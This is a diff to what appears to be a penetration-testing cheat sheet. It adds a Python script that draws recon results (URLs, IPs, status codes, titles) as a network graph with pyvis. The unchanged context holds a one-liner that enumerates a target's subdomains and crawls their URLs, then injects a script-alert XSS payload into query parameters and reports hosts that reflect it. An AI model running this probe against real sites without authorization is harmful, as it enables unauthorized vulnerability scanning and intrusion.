@@ -172,3 +172,52 @@ function Invoke-PasswordSearch {
 XSS line
 ~~~~
 echo target.com | subfinder -silent | katana -silent | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done
+~~~~
+Visualize.py
+~~~~
+import json
+import argparse
+from pyvis.network import Network
+
+# Set up argument parser
+parser = argparse.ArgumentParser(description='Visualize network data from a JSON file.')
+parser.add_argument('-f', '--file', required=True, help='Path to the JSON file to visualize.')
+args = parser.parse_args()
+
+# Load JSON data from the specified file
+with open(args.file, 'r') as f:
+    data = [json.loads(line) for line in f]
+
+# Initialize a PyVis Network with local resources
+net = Network(height='750px', width='100%', notebook=True, cdn_resources='local')
+
+# Add nodes and edges to the network
+for item in data:
+    # Create a node for the URL
+    url_node = item['url']
+    net.add_node(url_node, title=url_node)
+
+    # Create nodes for IP addresses
+    for ip in item['a']:
+        net.add_node(ip, title=ip)
+        net.add_edge(url_node, ip)
+
+    # Create nodes for status codes and titles
+    status_node = f"Status: {item['status_code']}"
+    net.add_node(status_node, title=status_node)
+    net.add_edge(url_node, status_node)
+
+    if 'title' in item:
+        title_node = item['title']
+        net.add_node(title_node, title=title_node)
+        net.add_edge(url_node, title_node)
+
+# Set the physics of the network
+net.force_atlas_2based()
+
+# Save and show the network
+net.show('network_visualization.html')
+
+
+
+
